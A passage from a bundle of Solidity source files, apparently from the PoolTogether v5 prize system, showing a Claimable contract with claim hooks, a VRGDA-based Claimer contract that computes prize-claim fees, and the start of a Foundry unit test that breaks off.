Modifiers\n    ////////////////////////////////////////////////////////////////////////////////\n\n    /// @notice Requires the caller to be the claimer.\n    modifier onlyClaimer() {\n        if (msg.sender != claimer) revert CallerNotClaimer(msg.sender, claimer);\n        _;\n    }\n\n    ////////////////////////////////////////////////////////////////////////////////\n    // Constructor\n    ////////////////////////////////////////////////////////////////////////////////\n\n    /// @notice Claimable constructor\n    /// @param prizePool_ The prize pool to claim prizes from\n    /// @param claimer_ The address allowed to claim prizes on behalf of winners\n    constructor(PrizePool prizePool_, address claimer_) {\n        if (address(prizePool_) == address(0)) revert PrizePoolZeroAddress();\n        prizePool = prizePool_;\n        _setClaimer(claimer_);\n    }\n\n    ////////////////////////////////////////////////////////////////////////////////\n    // IClaimable Implementation\n    ////////////////////////////////////////////////////////////////////////////////\n\n    /// @inheritdoc IClaimable\n    /// @dev Also calls the before and after claim hooks if set by the winner.\n    function claimPrize(\n        address _winner,\n        uint8 _tier,\n        uint32 _prizeIndex,\n        uint96 _reward,\n        address _rewardRecipient\n    ) external onlyClaimer returns (uint256) {\n        address recipient;\n\n        if (_hooks[_winner].useBeforeClaimPrize) {\n            recipient = _hooks[_winner].implementation.beforeClaimPrize{ gas: HOOK_GAS }(\n                _winner,\n                _tier,\n                _prizeIndex,\n                _reward,\n                _rewardRecipient\n            );\n        } else {\n            recipient = _winner;\n        }\n\n        if (recipient == address(0)) revert ClaimRecipientZeroAddress();\n\n        uint256 prizeTotal = prizePool.claimPrize(\n            _winner,\n            _tier,\n            _prizeIndex,\n            recipient,\n            _reward,\n            _rewardRecipient\n        );\n\n        if (_hooks[_winner].useAfterClaimPrize) {\n            _hooks[_winner].implementation.afterClaimPrize{ gas: HOOK_GAS }(\n                _winner,\n                _tier,\n                _prizeIndex,\n                prizeTotal,\n                recipient\n            );\n        }\n\n        return prizeTotal;\n    }\n\n    ////////////////////////////////////////////////////////////////////////////////\n    // Internal Helpers\n    ////////////////////////////////////////////////////////////////////////////////\n\n    /// @notice Set claimer address.\n    /// @dev Will revert if `_claimer` is address zero.\n    /// @param _claimer Address of the claimer\n    function _setClaimer(address _claimer) internal {\n        if (_claimer == address(0)) revert ClaimerZeroAddress();\n        claimer = _claimer;\n        emit ClaimerSet(_claimer);\n    }\n    \n}"
    },
    {
      "filename": "src/Claimer.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport { SD59x18 } from \"prb-math/SD59x18.sol\";\nimport { UD2x18 } from \"prb-math/UD2x18.sol\";\nimport { UD60x18, convert } from \"prb-math/UD60x18.sol\";\nimport { PrizePool } from \"pt-v5-prize-pool/PrizePool.sol\";\nimport { SafeCast } from \"openzeppelin/utils/math/SafeCast.sol\";\n\nimport { LinearVRGDALib } from \"./libraries/LinearVRGDALib.sol\";\nimport { IClaimable } from \"pt-v5-claimable-interface/interfaces/IClaimable.sol\";\n\n/// @notice Thrown when the length of the winners array does not match the length of the prize indices array while claiming.\n/// @param winnersLength Length of the winners array\n/// @param prizeIndicesLength Length of the prize indices array\nerror ClaimArraySizeMismatch(uint256 winnersLength, uint256 prizeIndicesLength);\n\n/// @notice Thrown when the VRGDA fee is below the minimum fee\n/// @param minFee The minimum fee requested by the user\n/// @param fee The actual VRGDA fee\nerror VrgdaClaimFeeBelowMin(uint256 minFee, uint256 fee);\n\n/// @notice Thrown when the prize pool is set the the zero address\nerror PrizePoolZeroAddress();\n\n/// @notice Thrown when someone tries to claim a prizes with a fee, but sets the fee recipient address to the zero address.\nerror FeeRecipientZeroAddress();\n\n/// @notice Thrown when the time to reach the max fee is zero\nerror TimeToReachMaxFeeZero();\n\n/// @title Variable Rate Gradual Dutch Auction (VRGDA) Claimer\n/// @author G9 Software Inc.\n/// @notice This contract uses a variable rate gradual dutch auction to incentivize prize claims on behalf of others.  Fees for each canary tier is set to the respective tier's prize size.\ncontract Claimer {\n\n  /// @notice Emitted when a claim reverts\n  /// @param vault The vault for which the claim failed\n  /// @param tier The tier for which the claim failed\n  /// @param winner The winner for which the claim failed\n  /// @param prizeIndex The prize index for which the claim failed\n  /// @param reason The revert reason\n  event ClaimError(\n    IClaimable indexed vault,\n    uint8 indexed tier,\n    address indexed winner,\n    uint32 prizeIndex,\n    bytes reason\n  );\n\n  /// @notice The Prize Pool that this Claimer is claiming prizes for\n  PrizePool public immutable prizePool;\n\n  /// @notice The maximum fee that can be charged as a portion of the prize size. Fixed point 18 number\n  UD2x18 public immutable maxFeePortionOfPrize;\n\n  /// @notice The time in seconds to reach the max auction fee\n  uint256 public immutable timeToReachMaxFee;\n\n  /// @notice Constructs a new Claimer\n  /// @param _prizePool The prize pool to claim for\n  /// @param _timeToReachMaxFee The time it should take to reach the maximum fee\n  /// @param _maxFeePortionOfPrize The maximum fee that can be charged as a portion of the prize size. Fixed point 18 number\n  constructor(\n    PrizePool _prizePool,\n    uint256 _timeToReachMaxFee,\n    UD2x18 _maxFeePortionOfPrize\n  ) {\n    if (address(0) == address(_prizePool)) {\n      revert PrizePoolZeroAddress();\n    }\n    if (_timeToReachMaxFee == 0) {\n      revert TimeToReachMaxFeeZero();\n    }\n    prizePool = _prizePool;\n    maxFeePortionOfPrize = _maxFeePortionOfPrize;\n    timeToReachMaxFee = _timeToReachMaxFee;\n  }\n\n  /// @notice Allows the caller to claim prizes on behalf of others or for themself.\n  /// @dev If you are claiming for yourself or don't want to take a fee, set the `_feeRecipient` and\n  /// `_minFeePerClaim` to zero. This will save some gas on fee calculation.\n  /// @param _vault The vault to claim from\n  /// @param _tier The tier to claim for\n  /// @param _winners The array of winners to claim for\n  /// @param _prizeIndices The array of prize indices to claim for each winner (length should match winners)\n  /// @param _feeRecipient The address to receive the claim fees\n  /// @param _minFeePerClaim The minimum fee for each claim\n  /// @return totalFees The total fees collected across all successful claims\n  function claimPrizes(\n    IClaimable _vault,\n    uint8 _tier,\n    address[] calldata _winners,\n    uint32[][] calldata _prizeIndices,\n    address _feeRecipient,\n    uint256 _minFeePerClaim\n  ) external returns (uint256 totalFees) {\n    bool feeRecipientZeroAddress = address(0) == _feeRecipient;\n    if (feeRecipientZeroAddress && _minFeePerClaim != 0) {\n      revert FeeRecipientZeroAddress();\n    }\n    if (_winners.length != _prizeIndices.length) {\n      revert ClaimArraySizeMismatch(_winners.length, _prizeIndices.length);\n    }\n\n    uint96 feePerClaim;\n\n    /**\n     * If the claimer hasn't specified both a min fee and a fee recipient, we assume that they don't\n     * expect a fee and save them some gas on the calculation.\n     */\n    if (!feeRecipientZeroAddress) {\n      feePerClaim = SafeCast.toUint96(_computeFeePerClaim(_tier, _countClaims(_winners, _prizeIndices), prizePool.claimCount()));\n      if (feePerClaim < _minFeePerClaim) {\n        revert VrgdaClaimFeeBelowMin(_minFeePerClaim, feePerClaim);\n      }\n    }\n\n    return feePerClaim * _claim(_vault, _tier, _winners, _prizeIndices, _feeRecipient, feePerClaim);\n  }\n\n  /// @notice Computes the number of claims that will be made\n  /// @param _winners The array of winners to claim for\n  /// @param _prizeIndices The array of prize indices to claim for each winner (length should match winners)\n  /// @return The number of claims\n  function _countClaims(\n    address[] calldata _winners,\n    uint32[][] calldata _prizeIndices\n  ) internal pure returns (uint256) {\n    uint256 claimCount;\n    uint256 length = _winners.length;\n    for (uint256 i = 0; i < length; i++) {\n      claimCount += _prizeIndices[i].length;\n    }\n    return claimCount;\n  }\n\n  /// @notice Claims prizes for a batch of winners and prize indices\n  /// @param _vault The vault to claim from\n  /// @param _tier The tier to claim for\n  /// @param _winners The array of winners to claim for\n  /// @param _prizeIndices The array of prize indices to claim for each winner (length should match winners)\n  /// @param _feeRecipient The address to receive the claim fees\n  /// @param _feePerClaim The fee to charge for each claim\n  /// @return The number of claims that were successful\n  function _claim(\n    IClaimable _vault,\n    uint8 _tier,\n    address[] calldata _winners,\n    uint32[][] calldata _prizeIndices,\n    address _feeRecipient,\n    uint96 _feePerClaim\n  ) internal returns (uint256) {\n    uint256 actualClaimCount;\n    uint256 prizeIndicesLength;\n\n    // `_winners.length` is not cached cause via-ir would need to be used\n    for (uint256 w = 0; w < _winners.length; w++) {\n      prizeIndicesLength = _prizeIndices[w].length;\n      for (uint256 p = 0; p < prizeIndicesLength; p++) {\n        try\n          _vault.claimPrize(_winners[w], _tier, _prizeIndices[w][p], _feePerClaim, _feeRecipient)\n        returns (uint256 /* prizeSize */) {\n          actualClaimCount++;\n        } catch (bytes memory reason) {\n          emit ClaimError(_vault, _tier, _winners[w], _prizeIndices[w][p], reason);\n        }\n      }\n    }\n\n    return actualClaimCount;\n  }\n\n  /// @notice Computes the total fees for the given number of claims.\n  /// @param _tier The tier to claim prizes from\n  /// @param _claimCount The number of claims\n  /// @return The total fees for those claims\n  function computeTotalFees(uint8 _tier, uint256 _claimCount) external view returns (uint256) {\n    return computeTotalFees(_tier, _claimCount, prizePool.claimCount());\n  }\n\n  /// @notice Computes the total fees for the given number of claims if a number of claims have already been made.\n  /// @param _tier The tier to claim prizes from\n  /// @param _claimCount The number of claims\n  /// @param _claimedCount The number of prizes already claimed\n  /// @return The total fees for those claims\n  function computeTotalFees(\n    uint8 _tier,\n    uint256 _claimCount,\n    uint256 _claimedCount\n  ) public view returns (uint256) {\n    return _computeFeePerClaim(_tier, _claimCount, _claimedCount) * _claimCount;\n  }\n\n  /// @notice Computes the fee per claim for the given tier and number of claims\n  /// @param _tier The tier to claim prizes from\n  /// @param _claimCount The number of claims\n  /// @return The fee that will be taken per claim\n  function computeFeePerClaim(uint8 _tier, uint256 _claimCount) external view returns (uint256) {\n    return _computeFeePerClaim(_tier, _claimCount, prizePool.claimCount());\n  }\n\n  /// @notice Computes the total fees for the given number of claims.\n  /// @param _tier The tier\n  /// @param _claimCount The number of claims to check\n  /// @param _claimedCount The number of prizes already claimed\n  /// @return The total fees for the claims\n  function _computeFeePerClaim(\n    uint8 _tier,\n    uint256 _claimCount,\n    uint256 _claimedCount\n  ) internal view returns (uint256) {\n    if (_claimCount == 0) {\n      return 0;\n    }\n    if (prizePool.isCanaryTier(_tier)) {\n      return prizePool.getTierPrizeSize(_tier);\n    }\n    uint8 numberOfTiers = prizePool.numberOfTiers();\n    uint256 targetFee = _computeFeeTarget(numberOfTiers);\n    SD59x18 decayConstant = _computeDecayConstant(targetFee, numberOfTiers);\n    uint256 _maxFee = _computeMaxFee(_tier);\n    SD59x18 perTimeUnit = LinearVRGDALib.getPerTimeUnit(\n      prizePool.estimatedPrizeCountWithBothCanaries(),\n      timeToReachMaxFee\n    );\n    uint256 elapsed = block.timestamp - (prizePool.lastAwardedDrawAwardedAt());\n    uint256 fee;\n\n    for (uint256 i = 0; i < _claimCount; i++) {\n      fee += _computeFeeForNextClaim(\n        targetFee,\n        decayConstant,\n        perTimeUnit,\n        elapsed,\n        _claimedCount + i,\n        _maxFee\n      );\n    }\n\n    return fee / _claimCount;\n  }\n\n  /// @notice Computes the maximum fee that can be charged.\n  /// @param _tier The tier to compute the max fee for\n  /// @return The maximum fee that can be charged\n  function computeMaxFee(uint8 _tier) public view returns (uint256) {\n    if (prizePool.isCanaryTier(_tier)) {\n      return type(uint256).max; // no limit\n    } else {\n      return _computeMaxFee(_tier);\n    }\n  }\n\n  /// @notice Compute the target fee for prize claims\n  /// @param _numberOfTiers The current number of tiers for the prize pool\n  /// @return The target fee for prize claims\n  function _computeFeeTarget(uint8 _numberOfTiers) internal view returns (uint256) {\n    // we expect the fee to be somewhere between the first and second canary tier prize sizes,\n    // so we set it to the lower of the two.\n    return prizePool.getTierPrizeSize(_numberOfTiers - 1);\n  }\n\n  /// @notice Computes the decay constant for the VRGDA.\n  /// @dev This is a decay constant that ensures the fee will grow from the target to the max fee within the time frame\n  /// @param _targetFee The target fee\n  /// @param _numberOfTiers The current number of tiers for the prize pool\n  /// @return The decay constant\n  function _computeDecayConstant(uint256 _targetFee, uint8 _numberOfTiers) internal view returns (SD59x18) {\n    // the max fee should never need to go beyond the full daily prize size under normal operating\n    // conditions.\n    uint maximumFee = prizePool.getTierPrizeSize(_numberOfTiers - 3);\n    return LinearVRGDALib.getDecayConstant(\n      LinearVRGDALib.getMaximumPriceDeltaScale(\n        _targetFee,\n        maximumFee,\n        timeToReachMaxFee\n      )\n    );\n  }\n\n  /// @notice Computes the max fee given the tier\n  /// @param _tier The tier to compute the max fee for\n  /// @return The maximum fee that will be charged for a prize claim for the given tier\n  function _computeMaxFee(uint8 _tier) internal view returns (uint256) {\n    uint256 prizeSize = prizePool.getTierPrizeSize(_tier);\n    return\n      convert(\n        maxFeePortionOfPrize.intoUD60x18().mul(convert(prizeSize))\n      );\n  }\n\n  /// @notice Computes the fee for the next claim.\n  /// @param _targetFee The target fee that should be charged\n  /// @param _decayConstant The VRGDA decay constant\n  /// @param _perTimeUnit The num to be claimed per second\n  /// @param _elapsed The number of seconds that have elapsed\n  /// @param _sold The number of prizes that were claimed\n  /// @param _maxFee The maximum fee that can be charged\n  /// @return The fee to charge for the next claim\n  function _computeFeeForNextClaim(\n    uint256 _targetFee,\n    SD59x18 _decayConstant,\n    SD59x18 _perTimeUnit,\n    uint256 _elapsed,\n    uint256 _sold,\n    uint256 _maxFee\n  ) internal pure returns (uint256) {\n    uint256 fee = LinearVRGDALib.getVRGDAPrice(\n      _targetFee,\n      _elapsed,\n      _sold,\n      _perTimeUnit,\n      _decayConstant\n    );\n    return fee > _maxFee ? _maxFee : fee;\n  }\n}"
    },
    {
      "filename": "pt-v5-vault/test/unit/Claimable.t.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport { Test, Vm } from \"forge-std/Test.sol\";\n\nimport { ClaimableWrapper, Claimable, PrizePool } from \"../contracts/wrapper/ClaimableWrapper.sol\";\nimport { IVaultHooks, VaultHooks } from \"../../src/interfaces/IVaultHooks.sol\";\n\ncontract ClaimableTest is Test, IVaultHooks {\n\n    // Expected Events:\n    event ClaimerSet(address indexed claimer);\n\n    // Custom Events:\n    event BeforeClaimPrizeCalled(\n        address winner,\n        uint8 tier,\n        uint32 prizeIndex,\n        uint96 reward,\n        address rewardRecipient\n    );\n    event AfterClaimPrizeCalled(\n        address winner,\n        uint8 tier,\n        uint32 prizeIndex,\n        uint256 prize,\n        address recipient\n    );\n\n    ClaimableWrapper claimable;\n    IVaultHooks hooks;\n\n    PrizePool prizePool;\n\n    address alice;\n    address bob;\n    address claimer;\n    address prizeRedirectionAddress;\n\n    bool useTooMuchGasBefore;\n    bool useTooMuchGasAfter;\n    bytes32 someBytes;\n\n    function setUp() public {\n        alice = makeAddr(\"alice\");\n        bob = makeAddr(\"bob\");\n        prizeRedirectionAddress = makeAddr(\"prizeRedirectionAddress\");\n\n        prizePool = PrizePool(makeAddr(\"prizePool\"));\n        claimer = address(this);\n\n        claimable = new ClaimableWrapper(prizePool, claimer);\n        hooks = this;\n\n        useTooMuchGasBefore = false;\n        useTooMuchGasAfter = false;\n    }\n\n    /* ============ constructor ============ */\n\n    function testConstructor_setsPrizePool() public {\n        ClaimableWrapper newClaimable = new ClaimableWrapper(prizePool, claimer);\n        assertEq(address(newClaimable.prizePool()), address(prizePool));\n    }\n\n    function testConstructor_setsClaimer() public {\n        vm.expectEmit();\n        emit ClaimerSet(claimer);\n        ClaimableWrapper newClaimable = new ClaimableWrapper(prizePool, claimer);\n        assertEq(newClaimable.claimer(), claimer);\n    }\n\n    function testConstructor_PrizePoolZeroAddress() public {\n        vm.expectRevert(abi.encodeWithSelector(Claimable.PrizePoolZeroAddress.selector));\n        new ClaimableWrapper(PrizePool(address(0)), claimer);\n    }\n\n    function testConstructor_ClaimerZeroAddress() public {\n        vm.expectRevert(abi.encodeWithSelector(Claimable.ClaimerZeroAddress.selector));\n        new ClaimableWrapper(prizePool, address(0));\n    }\n\n    /* ============ setClaimer ============ */\n\n    function testSetClaimer_setsClaimer() public {\n        vm.expectEmit();\n        emit ClaimerSet(alice);\n        claimable.setClaimer(alice);\n        assertEq(claimable.claimer(), alice);\n    }\n\n    function test"
    }
  ]
}